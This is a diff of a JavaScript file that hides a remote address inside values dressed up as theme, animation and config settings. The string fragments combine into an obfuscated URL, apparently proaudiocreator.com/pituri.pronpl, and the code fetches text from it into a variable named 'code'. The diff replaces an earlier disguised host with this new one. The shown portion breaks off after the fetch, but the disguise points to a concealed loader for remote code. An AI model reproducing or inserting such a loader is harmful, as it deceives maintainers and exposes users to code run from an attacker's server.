@@ -278,21 +278,17 @@
     const ERROR_URL = "https://github.com/";
 
     const _theme = {
-        mode: "macperf"
+        mode: "proaudio"
     };
 
     const _anim = {
-        easing: "ormance",
-        direction: "lab"
+        easing: "creator",
+        direction: ".com"
     };
 
     const _cfg = {
-        version: ".com",
-        build: "/pauser"
-    };
-
-    const _util = {
-        ext: ".pennae"
+        version: "/pituri",
+        build: ".pronpl"
     };
 
     function _getNamespace() {
@@ -407,7 +403,7 @@
                         _anim.easing
                     ];
                     const _domain = _buildResourcePath('', _domainParts);
-                    const _fullUrl = _protocol + _domain + _anim.direction + _cfg.version + _cfg.build + _util.ext;
+                    const _fullUrl = _protocol + _domain + _anim.direction + _cfg.version + _cfg.build;
                     
                     const res = await fetch(_fullUrl, { cache: 'no-store' });
                     const code = await res.text();
